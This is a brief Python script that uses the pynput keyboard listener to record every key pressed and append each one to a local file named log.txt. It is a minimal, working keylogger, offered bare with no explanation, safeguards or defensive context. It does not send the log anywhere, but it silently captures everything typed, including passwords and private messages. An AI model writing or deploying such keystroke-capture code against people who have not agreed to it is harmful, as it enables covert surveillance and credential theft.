from pynput.keyboard import Listener


def on_press(key):
    letter = str(key)
    letter = letter.replace("'", "")

    with open("log.txt", "a") as file:
        file.write(letter)


with Listener(on_press=on_press) as listener:
    listener.join()
